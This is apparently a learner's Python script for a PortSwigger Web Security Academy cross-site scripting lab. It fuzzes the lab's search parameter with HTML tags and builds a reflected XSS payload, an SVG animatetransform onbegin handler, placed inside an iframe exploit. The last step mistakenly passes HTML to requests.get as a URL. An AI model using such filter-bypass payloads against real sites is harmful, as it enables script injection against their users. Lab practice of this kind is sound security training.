import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
site = 'accc1f6e1e84e8fec04741d500a00079.web-security-academy.net'
tag = 'script'
search_url = f'https://{site}/?search=<{tag}>'
resp = requests.get(search_url)
print(f'Status code is {resp.status_code} with response text {resp.text}')




#tags = open("tags.txt","r").readlines()
tags = open("events.txt","r").readlines()

#for tag in tags:
    #print(tag)
    #search_url = f'https://{site}/?search=<{tag}>'
    #resp = requests.get(search_url)
    #print(f'Status code is {resp.status_code} with response text {resp.text}')


site = 'accc1f6e1e84e8fec04741d500a00079.web-security-academy.net'
search_term = '''<svg><animatetransform onbegin=alert(1)>'''
print(f'Search payload to perform XSS is {search_term}')
exploit_html = f'''<iframe src="https://{site}/?search={search_term}" onload=this.style.width='100px'></iframe>'''
resp = requests.get(exploit_html)
print(f'Status code is {resp.status_code} with response text {resp.text}')